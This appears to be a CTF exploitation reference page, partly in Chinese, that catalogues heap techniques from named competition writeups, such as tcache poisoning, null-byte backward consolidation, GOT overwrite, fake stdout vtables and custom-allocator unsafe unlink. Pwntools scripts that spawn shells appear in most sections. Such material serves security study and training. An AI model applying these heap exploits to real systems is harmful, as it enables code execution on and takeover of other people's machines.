# Heap Exploitation Techniques (Part 2)

Continuation of [heap-techniques.md](heap-techniques.md). Part 2 collects CTF-specific UAF, tcache, and custom-allocator variants drawn from individual writeups.

## Table of Contents
- [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
- [Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)](#uninitialized-chunk-residue-pointer-leak-picoctf-2018)
- [tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)](#tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018)
- [Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)](#adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite-ritsec-2018)
- [Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)](#hidden-menu-option-1337-for-tcache-poisoning-fireshell-2019)
- [Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)](#tcache-double-free--fake-_io_file-vtable-stdout-hijack-bctf-2018)
- [Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)](#tcache-to-fastbin-promotion-cross-bin-attack-bctf-2018)
- [6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)](#6-bit-index-oob--written_bytes-accumulator-for-fn-pointer-increment-codegate-2019)
- [IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)](#is_mmaped-bit-flip-for-unsorted-bin-leak-on-callocd-chunk-0ctf-2017)
- [Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)](#filename-regex-constrained-fastbin-via-lsb-only-heap-pointer-overwrite-bsidessf-2019)
- [Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)](#custom-allocator-unsafe-unlink-to-got-def-con-qualifier-2014)

For FILE-structure (_IO_FILE) exploitation see [heap-fsop.md](heap-fsop.md). For the foundational houses (Apple 2, Einherjar, Orange, Spirit, Lore, Force), unsafe unlink, tcache stashing, and musl, see [heap-techniques.md](heap-techniques.md).

---

## UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)

**模式：** 在 UAF 之后，堆喷填充内存，偏移 3 字节处放置 `system()` 地址。vtable 指针地址 `0x??006873` 在对象起始处编码了 ASCII 字符串 `"sh\x00"`，因此通过 vtable 调用 `system()` 会执行 `system("sh")`。

```python
from pwn import *

# 堆喷：用 system() 地址填充 16MB，偏移 +3 字节
# 每个喷射单元：3 字节填充 + 8 字节 system_addr，重复
spray_unit = b"\x00" * 3 + p64(system_addr)
spray_data = spray_unit * (0x1000000 // len(spray_unit))

# 通过应用接口触发堆喷
for i in range(spray_count):
    alloc(spray_data[:chunk_size])

# UAF 对象地址 0xXX006873
# 对象起始字节：73 68 00 XX = "sh\x00..."
# 当 vtable 调用分发时：system(this) → system("sh")

# 触发：释放目标对象，然后调用其虚函数
free(target_obj)
trigger_vtable_call(target_obj)  # 调用 system("sh")
```

**关键洞察：** vtable 指针值本身作为传递给 `system()` 的字符串参数。通过堆喷使对象落在地址中低字节包含 `0x6873`（ASCII "sh"）的位置，对象地址即是有效的 shell 命令字符串。这样无需单独控制字符串——指针本身就是参数。

**识别时机：** 针对带虚函数的 C++ 对象的 UAF，控制堆布局但无法精确控制对象 `this` 指针处内容。如果 `system()` 以 `this` 作为第一个参数调用（vtable 调用常见），只需对象地址能解码为有效命令字符串。

**参考：** BCTF 2017

有关 FILE 结构 (_IO_FILE) 利用见 [heap-fsop.md](heap-fsop.md)：fastbin stdout vtable 劫持、_IO_buf_base 空字节覆盖、glibc 2.24+ vtable 验证绕过、stdin FILE 字段的 unsorted-bin 攻击及相关 UAF/refcount 漏洞。

---
## 未初始化的 Chunk 残留指针泄露 (picoCTF 2018)

**模式：** 一个联系人管理器在堆上分配一个结构体 `{name, bio}`，但只写入了 `name`，`bio` 保持未初始化。在删除后重新创建的循环中，新分配复用了一个仍然持有之前联系人残留指针的 chunk。应用的 `print_contact()` 解引用了 `bio`，将分配器残留的指针变成了可控的堆/ libc 读取。

```c
struct contact { char *name; char *bio; };    // bio 从未被清零

void create() {
    struct contact *c = malloc(sizeof *c);
    c->name = malloc(NAME_SZ);
    read_line(c->name, NAME_SZ);
    // bio 保持未初始化！
}

void print(struct contact *c) { puts(c->bio); }   // 泄露了残留指针目标
```

```python
from pwn import *
io = process("./contacts")

# 1. 预热堆：创建一个联系人，其 name chunk 后续会被复用
#    作为下一个联系人的结构体。
io.sendline("create");  io.sendline("A" * 0x18)
io.sendline("delete 0")

# 2. 创建新联系人 — 它获取了之前释放的 chunk。旧的
#    name 字节现在存活在结构体的 `bio` 字段中。
io.sendline("create");  io.sendline("B" * 0x10)

# 3. 打印 → 泄露残留数据，表现为 bio 字符串。
io.sendline("print 0")
leak = u64(io.recvline().ljust(8, b"\x00"))
log.success(f"heap leak: {leak:#x}")
```

**关键洞察：** 未初始化字段在逆向上是写什么-哪里（write-what-where）原语 — 攻击者不能选择字段持有什么，但可以放置 chunk 使有用字节落入其中。目标是任何 (a) 后续读取但未写入的结构体字段，且 (b) 受 chunk 复用影响的字段。常见罪魁祸首：手写的 `malloc` + `read_line` 配对，C++ 类中非默认构造函数跳过初始化的成员，以及先零分配后部分写入的缓存。

**参考：** picoCTF 2018 — Contacts，writeup 11585

---

## tcache strcpy 空字节溢出 + 向后合并 (HITCON 2018)

**模式：** `strcpy(dst, user_name)` 追加的尾部 NUL 字节落在分配 chunk 之后一个字节，清除了下一个 chunk size 字段的 `PREV_INUSE` 标志。配合伪造的 `prev_size`，`free()` 触发跨越 tcache chunk 的向后合并，产生两个重叠的堆区域。拆分出剩余 chunk 后，main_arena 指针保留在其中一个重叠分配的 `fd`/`bk` 中，带来 tcache 时代的 unsorted-bin 风格 libc 泄露。

```c
// 分配模式 (glibc 2.27 tcache)
char *a = malloc(0xF8);            // 受害者 1
char *b = malloc(0x18);            // 带 PREV_INUSE 的小头 chunk
strcpy(a, payload);                // 0xF8 字节 + '\0' 溢出到 b->size
```

```python
from pwn import *

io = process("./children_tcache")
libc = ELF("./libc-2.27.so")

# 1. 用多次较小分配清零 0xda memset 残留。
for size in (0x70, 0x60, 0x50, 0x40):
    io.sendline("add"); io.sendline(str(size)); io.sendline(b"\x00" * size)

# 2. 设置两个相邻 chunk：
io.sendline("add"); io.sendline("0xF8"); io.sendline(b"A" * 0xF8)     # 受害者 1
io.sendline("add"); io.sendline("0x18"); io.sendline(b"B" * 0x18)     # 头部

# 3. 释放受害者 1 到 smallbin（需要一个 > 0x408 的兄弟 chunk 以绕过 tcache）。
io.sendline("add"); io.sendline("0x420"); io.sendline(b"X" * 0x420)
io.sendline("del 0")                         # smallbin → 保留 libc fd/bk

# 4. 通过 strcpy 溢出：清除 PREV_INUSE，伪造 prev_size → 向后合并
overflow = b"A" * 0xF0 + p64(0x100)           # 伪造 prev_size
io.sendline("edit 1"); io.sendline(overflow)
io.sendline("del 1")                         # 合并：现在重叠了

# 5. 重新分配合并区域并读取仍存于旧 fd/bk 位置的 libc 指针。
io.sendline("add"); io.sendline("0x110"); io.sendline(b"P" * 0x10)
io.sendline("show 0")
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - (libc.symbols["main_arena"] + 0x60)
log.success(f"libc base {libc.address:#x}")
```

**关键洞察：** tcache 绕过了大多数 pre-2.27 的合并技巧，但 `strcpy` 空字节溢出依然有效，因为它作用于*下一个 chunk 的头部*，而非当前 chunk 的 in-use 标志。结合对 glibc 2.26+ free 时 memset 残留（`0xda` 模式）的精心清零，可以在 tcache 环境中复用经典的 off-by-one-null 技术。关键大小是：足够大以跳过 tcache（释放 chunk >0x408），又足够小以紧邻溢出目标。

**参考：** HITCON CTF 2018 — Children Tcache，writeup 11929

---
## Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)

**模式：** 使用 `cgo` 编译的 Go 二进制文件将一个名称缓冲区紧挨着一个其第一个字段是函数指针（C 风格虚表）的结构体放置。溢出名称字段会破坏下一个结构体的函数指针。第一次覆盖 → 重定向调用到 `puts(got['free'])` 以泄露 libc。第二次覆盖 → 将 free 的 GOT 条目指向 `system`，然后释放一个内容为 `"/bin/sh"` 的 chunk。

```python
# 1. 泄露 libc
payload = b'A'*name_size + p64(puts_plt) + p64(pop_rdi_ret) + p64(free_got)
io.send(payload); io.recvuntil(b'name: '); libc = u64(io.recv(6).ljust(8, b'\x00'))

# 2. 用 system 覆盖 free@GOT
libc_base = libc - libc_syms['puts']
io.send(b'A'*name_size + p64(libc_base + libc_syms['system']))

# 3. 释放内容为 "/bin/sh\x00" 的 chunk
io.sendline('/bin/sh')
io.sendline('delete 0')
```

**关键洞察：** cgo 二进制文件通常在 Go 分配的缓冲区旁边有 C 风格的结构体，因此经典的 C 堆技术仍然对 Go 服务器有效。反编译时寻找 `GoString` + `char*` + 函数指针的模式；布局通常是确定的。

**参考：** RITSEC CTF 2018 — Yet Another HR Management Framework，writeups 12283, 12287

---

## Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)

**模式：** 可见菜单限制了分配数量，但反汇编显示有一个未记录的选项（`1337`），它调用 `malloc` 和 `edit`，但不更新计数器 —— 实际上给你无限分配。结合普通的 tcache UAF，这让你可以淹没 tcache，覆盖某个条目的 `fd` 指向 BSS 目标，并 `malloc` 任意地址。

```python
def hidden(sz, data):
    p.sendlineafter(b'>', b'1337')
    p.sendlineafter(b'size:', str(sz).encode())
    p.sendafter(b'data:', data)

free(0); free(1)
hidden(0x20, p64(bss_target))   # tcache fd → bss_target
_ = malloc(0x20)                # 第一个 chunk 回来
shell = malloc(0x20)            # 返回 bss_target
```

**关键洞察：** 在假设挑战“有限制”之前，务必导出菜单解析器以查找未记录的分支。像 `1337`、`9999`、`0xdead` 这样的数字选项是作者用来调试挑战的经典绕过手段。

**参考：** FireShell CTF 2019 — babyheap，writeup 12962

---

## Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)

**模式：** 分配预算小，fastbin + tcache 可用。对一个 fastbin chunk 进行 double-free 到 tcache，malloc 获得一个指向 `_IO_2_1_stdout_` 的 tcache 条目，然后覆盖 stdout 的 `vtable` 指针为一个伪造跳转表，其中 `_IO_file_overflow` 指向 `system`。下一次 printf 调用执行 `system("/bin/sh")`。

```python
# 1. 对 A 进行两次 free（通过 tcache 绕过 fastbin double-free 检查）
free(A); free(A)
# 2. malloc 返回 A；写入 stdout 地址作为下一个 fd
edit(A, p64(stdout))
# 3. 下一次 malloc 返回 stdout
malloc()
malloc()  # 返回 &stdout
edit(stdout, fake_file_struct(vtable=fake_vt))
```

伪造 vtable 条目：_IO_file_overflow = system 的槽位。

**关键洞察：** tcache 跳过 fastbin 的安全检查，因此 double-free 直接进入 tcache 不需要通常的大小字段技巧。由此产生的写入-何处原语轻松达到 libc 中的 `_IO_2_1_stdout_`。

**参考：** BCTF 2018 — easiest，writeup 12489

---

## Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)

**模式：** 只有大约 2 次分配 —— 传统的 tcache dup 不够用。相反，填满 tcache，溢出到 fastbin，构造一个 chunk 其头部指向已知结构内部。当 fastbin 分配在未来的 free 后提升回 tcache，malloc 返回头部地址。

```python
for _ in range(7): free(tcache_chunks[_])   # 填满 tcache bin
free(fastbin_chunk)                         # 进入 fastbin
edit(fastbin_chunk, p64(target_hdr))        # 污染 fastbin fd
# 清空 tcache 以便下一次 free fastbin_chunk 触发提升：
for _ in range(7): malloc(size)
free(fastbin_chunk)                         # 现在进入 tcache
malloc(size)                                 # 返回 tcache 头 = target_hdr
```

**关键洞察：** tcache 和 fastbin 在某些大小边界共享大小类别；一个 chunk 从一个区域开始，常常会迁移到另一个。预算紧张时，利用这种提升作为额外的重新分配步骤。

**参考：** BCTF 2018 — three/houseofatum，writeups 12476, 12477

---
## 6-Bit Index OOB + written_bytes 累加器用于函数指针递增 (Codegate 2019)

**模式（archiver）：** C++ 压缩器维护一个 48 元素的 QWORD 缓存（`cached_qwords[48]`），但缓存读写操作码接受一个 6 位索引（0-63），导致对周围对象（`buf`、`buf_size`、`buf_offset_Q`、`written_bytes`、`print_uncomp_fsz`）的越界访问。所有操作均为 QWORD 对齐，因此无法直接切片函数指针；相反，利用未使用的 `written_bytes` 计数器作为可编程偏移累加器，将 `print_uncomp_fsz` 变成 `cat_flag()`。

```python
# OOB 写入原语（a2 在 [0, 0x3f] 范围内）：
#   cache_qword(a2, k)            -> cached_qwords[a2] = buf[buf_off_Q - k]
#   save_cached_qword_to_comp(a2) -> buf[++off] = cached_qwords[a2]; written_bytes += 8

# 1. 预分配 buf，避免后续 realloc 导致数据丢失。
# 2. 通过 OOB save_cached_qword_to_comp(0x34) 将 print_uncomp_fsz 保存到 buf。
# 3. 通过 OOB cache_qword(0x33, 1) 将其移回 written_bytes。
# 4. 发送 0x38 个缓存的 QWORD -> written_bytes += 0x38*8 == 0x1c0（偏移到 cat_flag）。
# 5. 将现在递增的 written_bytes 保存到 buf，然后 OOB 写回覆盖 print_uncomp_fsz。
#    触发错误路径使 main() 调用它。
payload += save_cached_qword_to_comp(0x34)       # 函数指针 -> buf
payload += cache_qword(0x33, 1)                  # buf -> written_bytes
payload += save_cached_qword_to_comp(0) * 0x38   # written_bytes += 0x1c0
payload += save_cached_qword_to_comp(0x33)       # written_bytes -> buf
payload += cache_qword(0x34, 1)                  # buf -> print_uncomp_fsz
```

**关键洞察：** 当 OOB 写入是 QWORD 对齐，但目标函数仅距离现有指针 `N*0x10` 字节时，寻找同一结构体中由已知步长递增的进程本地计数器。将该计数器视为算术垫片，将对齐写入原语转变为字节精确的指针递增，绕过 PIE 而无需泄露代码地址。

**参考资料：** Codegate CTF 2019 预赛 — archiver，writeup 13014

---

## IS_MMAPED 位翻转导致 Calloc 分配块的 Unsorted Bin 泄露 (0CTF 2017)

**模式（BabyHeap2017）：** 在全防护二进制（Full RELRO、canary、NX、PIE、ASLR）中发生堆溢出。`calloc` 通常会将新分配的块清零，阻止经典的 unsorted-bin 泄露（fd/bk 覆盖可重用数据）。但当块的 `IS_MMAPED` 标志被设置时，glibc 会跳过清零。通过溢出前一个块翻转已释放 unsorted-bin 块的 `IS_MMAPED`，然后用 `calloc` 重新分配它——fd/bk 中的 arena 指针得以保留并泄露 libc。

```python
# 布局：A (0x80) | B (0x80 已释放 -> unsorted) | C (溢出目标)
# 从 A 溢出到 B 的块头：设置 size |= IS_MMAPED（size 字段的第 1 位）
edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))    # prev_size=0, size=0x91|IS_MMAPED

# calloc 重新分配 B：由于 IS_MMAPED 被设置，calloc 不会 memset。
# B 的 fd/bk 仍指向 main_arena + 0x58 -> 通过 view(B) 泄露 libc。
malloc(0x80)                   # 返回 B，前 16 字节中保留 libc 指针
libc_base = leak - main_arena_offset

# 后续：fastbin 重复 -> __malloc_hook -> one_gadget
```

**关键洞察：** `calloc` 的清零取决于分配路径。通过堆溢出设置 `IS_MMAPED`，欺骗 `calloc` 将重用块视为新 mmap 的块，跳过 `memset`，保留 fd/bk 中之前写入的 arena 指针。2 位元数据覆盖打破了“calloc 阻止泄露”的假设。

**参考资料：** 0CTF 2017 资格赛 — babyheap，writeup 13262

---
## Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)

**模式（straw_clutcher）：** 文件服务器堆有一个 `RENAME` 处理程序，它对 `old_name` 进行了两次长度检查，而不是对 `old_name`/`new_name`，导致对相邻的 `file_t`（`filename[0x20]`、`file_size`、`data`、`free_option`、`prev_file`）发生有界堆溢出。每个文件名必须匹配 `[A-Za-z0-9]+.[A-Za-z0-9]{3}`，这排除了完整的 fastbin-fd 覆盖——但正则表达式只检查存储在 `filename` 中的**第一个以 null 结尾的字符串**，因此 null 之后的字节不受限制。只破坏 `prev_file` 的最低有效字节，使其重新指向 `file->data`（攻击者控制），伪造一个假 chunk，从而实现对 `__malloc_hook` 的 double-free + fastbin 攻击。

```python
# 1. 通过覆盖 file_size 为巨大值泄露 libc/heap，然后 RETR 命令转储堆。
# 2. 创建一个数据字节满足正则的文件，作为伪造的 file_t chunk 头。
pc.sendline('PUT EEE.EXE {}'.format(0x48))
pc.send(p64(0x4848482e484848) + p64(0)*4       # 伪造文件名 "HHH.HHH"
        + p64(0x68)                             # 伪造 file_size
        + p64(heap + 0x250) + p64(0)            # 伪造 data
        + p64(heap + 0x190))                    # 伪造 prev_file
# 3. 产生两个 0x70 大小的已释放 chunk，然后通过 rename 覆盖 file->prev_file 的最低有效字节：
pc.sendline('RENAME EEE.EXE ' + 'E'*7*8 + 'EEEEE.EXP')
# 只有 prev_file 的最低有效字节改变 -> 高位字节保持，最低字节落在 data 内部。
# 4. 删除伪造条目 -> 对 0x70 tcache/fastbin 触发 double-free。
# 5. 经典 fastbin 污染 __malloc_hook - 0x23，然后用 PUT 触发。
```

**关键洞察：** 当溢出是按字节寻址但必须通过字符类过滤时，只针对堆元数据指针的最低有效字节。堆地址在 chunk 之间共享高位字节，因此单个攻击者控制的最低有效字节可以将指针重新定位到同一 256 字节窗口内——足以让它落入你已控制的缓冲区，绕过会拒绝完整 8 字节覆盖的正则/字符集限制。

**参考资料：** BSidesSF 2019 — straw_clutcher，writeup 13763

---

## Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)

**模式：** 非 glibc 分配器带有天真的 `free` —— 设置 `mem[fd] = bk`（以及对称的 `mem[bk+4] = fd`），但没有任何安全 unlink 一致性检查。第 10 个 chunk（0x104 字节）溢出破坏了第 11 个 chunk 的 `fd`/`bk`，使得当第 9 个 chunk 被释放且第 11 个 chunk 在合并时成为其“邻居”，unlink 操作写入 `printf@GOT` → 跳转到 shellcode。

```python
from pwn import *
context(arch='i386', os='linux')

printf_got = 0x804c004
array_10_addr = 0x...   # 从横幅输出 "loc=0xADDR" 泄露

payload  = p32(printf_got - 8)       # 伪造 fd -> 目标 = printf GOT（减 8 作为偏移）
payload += p32(array_10_addr + 8)    # 伪造 bk -> 值 = shellcode 跳转地址
payload += b"\xeb\x08" + b"A"*8 + asm(shellcraft.sh())  # jmp +8; 填充; shellcode
payload += b"A" * (260 - len(payload))
payload += p32(0)                    # 下一个 chunk 的 size 字段（prev_in_use = 0）
```

**关键洞察：** 自定义分配器几乎从不实现 glibc 在 2004 年引入的 `fd->bk == chunk && bk->fd == chunk` 安全 unlink 检查。经典的通过 `unlink(chunk)` 实现的 `write-what-where` 攻击完全适用——目标是即将调用的 GOT 条目（printf、free、puts），并在 8 字节写入槽上方放置一个短的 `jmp +8` 跳转到 shellcode。验证哨兵 chunk 的伪造 `size` 字段，使分配器仍然合并而不是中止。

**参考资料：** DEF CON CTF Qualifier 2014 — heap，writeup 13953
